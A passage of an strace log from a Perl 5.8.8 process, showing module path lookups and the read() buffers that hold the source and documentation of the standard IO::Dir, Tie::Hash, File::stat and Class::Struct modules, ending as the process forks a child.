= @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
5970  07:11:35.498752 stat64("/etc/perl/Tie/Hash.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.498785 stat64("/etc/perl/Tie/Hash.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.498798 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.498811 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.498825 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.498837 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.498851 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.498862 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.498875 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.498887 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.498900 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.498912 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.498925 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.498938 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
5970  07:11:35.498959 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.498973 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.498984 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.499003 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
5970  07:11:35.499360 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
5970  07:11:35.499978 read(8, "", 4096) = 0
5970  07:11:35.499994 close(8)          = 0
5970  07:11:35.500025 stat64("/etc/perl/File/stat.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.500040 stat64("/etc/perl/File/stat.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.500054 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.500067 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.500080 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.500093 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.500107 stat64("/usr/lib/perl5/File/stat.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.500119 stat64("/usr/lib/perl5/File/stat.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.500131 stat64("/usr/share/perl5/File/stat.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.500144 stat64("/usr/share/perl5/File/stat.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.500157 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.500170 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.500197 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.500240 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
5970  07:11:35.500278 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.500293 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.500305 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.500327 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
5970  07:11:35.500781 stat64("/etc/perl/Class/Struct.pmc", 0xbf8eb4dc) = -1 ENOENT (No such file or directory)
5970  07:11:35.500800 stat64("/etc/perl/Class/Struct.pm", 0xbf8eb3ec) = -1 ENOENT (No such file or directory)
5970  07:11:35.500814 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbf8eb4dc) = -1 ENOENT (No such file or directory)
5970  07:11:35.500827 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbf8eb3ec) = -1 ENOENT (No such file or directory)
5970  07:11:35.500845 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbf8eb4dc) = -1 ENOENT (No such file or directory)
5970  07:11:35.500858 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbf8eb3ec) = -1 ENOENT (No such file or directory)
5970  07:11:35.500873 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbf8eb4dc) = -1 ENOENT (No such file or directory)
5970  07:11:35.500884 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbf8eb3ec) = -1 ENOENT (No such file or directory)
5970  07:11:35.500897 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbf8eb4dc) = -1 ENOENT (No such file or directory)
5970  07:11:35.500909 stat64("/usr/share/perl5/Class/Struct.pm", 0xbf8eb3ec) = -1 ENOENT (No such file or directory)
5970  07:11:35.500923 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbf8eb4dc) = -1 ENOENT (No such file or directory)
5970  07:11:35.500935 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbf8eb3ec) = -1 ENOENT (No such file or directory)
5970  07:11:35.500949 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbf8eb4dc) = -1 ENOENT (No such file or directory)
5970  07:11:35.500961 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
5970  07:11:35.500983 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
5970  07:11:35.500997 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb1f8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.501009 _llseek(10, 0, [0], SEEK_CUR) = 0
5970  07:11:35.501027 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
5970  07:11:35.501514 brk(0x82de000)    = 0x82de000
5970  07:11:35.501926 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
5970  07:11:35.502510 _llseek(10, 6916, [6916], SEEK_SET) = 0
5970  07:11:35.502527 _llseek(10, 0, [6916], SEEK_CUR) = 0
5970  07:11:35.502537 close(10)         = 0
5970  07:11:35.502770 _llseek(8, 1334, [1334], SEEK_SET) = 0
5970  07:11:35.502787 _llseek(8, 0, [1334], SEEK_CUR) = 0
5970  07:11:35.502798 close(8)          = 0
5970  07:11:35.503484 brk(0x82ff000)    = 0x82ff000
5970  07:11:35.503626 _llseek(6, 2689, [2689], SEEK_SET) = 0
5970  07:11:35.503641 _llseek(6, 0, [2689], SEEK_CUR) = 0
5970  07:11:35.503652 close(6)          = 0
5970  07:11:35.503876 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d34908) = 5971
5971  07:11:35.503960 getppid()         = 5970
